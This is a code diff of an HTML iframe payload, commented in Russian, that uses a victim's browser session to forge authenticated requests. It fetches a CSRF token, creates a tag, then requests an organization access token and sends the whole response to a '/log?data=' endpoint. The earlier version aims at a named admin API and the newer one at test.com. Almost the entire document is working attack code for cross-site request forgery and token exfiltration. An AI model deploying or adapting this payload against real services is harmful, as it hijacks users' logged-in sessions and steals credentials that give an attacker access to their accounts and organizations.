@@ -1,46 +1,68 @@
 <iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
-var csrfReq = new XMLHttpRequest();
-csrfReq.open('POST', 'https://ext-api-admin.oneme.ru/v1/csrf/refresh', true);
-csrfReq.withCredentials = true;
+(async function () {
+    const baseUrl = 'https://test.com';
 
-csrfReq.onload = function () {
-    if (csrfReq.status < 200 || csrfReq.status >= 300) {
-        console.error('Ошибка получения CSRF-токена:', csrfReq.status);
-        return;
-    }
+    async function request(path, options = {}) {
+        const response = await fetch(baseUrl + path, {
+            ...options,
+            credentials: 'include'
+        });
 
-    var csrfToken;
-    try {
-        csrfToken = JSON.parse(csrfReq.responseText).csrf_token;
-        if (typeof csrfToken !== 'string' || !csrfToken) {
-            throw new Error('В ответе отсутствует csrf_token');
+        if (!response.ok) {
+            throw new Error(`${path}: HTTP ${response.status}`);
         }
-    } catch (error) {
-        console.error('Некорректный ответ сервера:', error);
-        return;
+
+        return response;
     }
 
-    var req = new XMLHttpRequest();
-    req.onload = function () {
-    if (req.status >= 200 && req.status < 300) {
-        console.log('Тег создан:', req.responseText);
-    } else {
-        console.error('Ошибка создания тега:', req.status, req.responseText);
+    // 1. Получаем CSRF-токен.
+    const csrfResponse = await request('/v1/csrf/refresh', {
+        method: 'POST'
+    });
+    const { csrf_token } = await csrfResponse.json();
+
+    if (typeof csrf_token !== 'string' || !csrf_token) {
+        throw new Error('В ответе отсутствует csrf_token');
     }
-};
-    req.onerror = function () {
-        console.error('Сетевая ошибка при создании тега');
+
+    const headers = {
+        'Content-Type': 'application/json',
+        'X-Csrf-Token': csrf_token
     };
-    req.open('POST', 'https://ext-api-admin.oneme.ru/v1/tag/create', true);
-    req.withCredentials = true;
-    req.setRequestHeader('Content-Type', 'application/json');
-    req.setRequestHeader('X-Csrf-Token', csrfToken);
-    req.send(JSON.stringify({ text: 'testik', color: 'orange' }));
-};
 
-csrfReq.onerror = function () {
-    console.error('Сетевая ошибка при получении CSRF-токена');
-};
+    // 2. Создаём тег.
+    await request('/v1/tag/create', {
+        method: 'POST',
+        headers,
+        body: JSON.stringify({
+            text: 'testik',
+            color: 'orange'
+        })
+    });
 
-csrfReq.send();
+    // 3. Выполняем новый POST с тем же CSRF-токеном.
+    const tokenResponse = await request('/v1/organizations/create-token', {
+        method: 'POST',
+        headers,
+        body: JSON.stringify({
+            inn: '12345678',
+            admin: {
+                phone: '+399999999999'
+            }
+        })
+    });
+
+    // 4. Получаем весь JSON-ответ и кодируем его для query-параметра.
+    const responseBody = await tokenResponse.json();
+    const data = encodeURIComponent(JSON.stringify(responseBody));
+
+    // 5. Отправляем финальный GET.
+    await request('/log?data=' + data, {
+        method: 'GET'
+    });
+
+    console.log('Все запросы выполнены успешно');
+})().catch(function (error) {
+    console.error('Ошибка выполнения запросов:', error);
+});
 </script>"></iframe>
